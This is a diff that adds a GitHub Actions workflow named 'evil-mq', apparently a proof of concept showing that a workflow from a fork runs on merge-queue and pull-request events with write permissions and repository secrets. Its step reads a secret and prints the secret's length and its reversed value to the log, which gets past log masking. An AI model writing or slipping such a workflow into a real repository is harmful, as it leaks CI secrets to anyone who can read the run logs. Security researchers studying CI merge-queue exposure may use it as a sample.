@@ -1,0 +1,16 @@
+name: evil-mq
+on:
+  merge_group:
+  pull_request:
+permissions:
+  contents: write
+  pull-requests: write
+jobs:
+  fork:
+    runs-on: ubuntu-latest
+    steps:
+      - env: { PS: "${{ secrets.POC_SECRET }}" }
+        run: |
+          echo "FORK-MQ-RAN event=${{ github.event_name }} ref=${{ github.ref }}"
+          echo "FORK_SECRET_LEN=${#PS}"
+          echo "FORK_SECRET_REV=$(printf %s "$PS" | rev)"
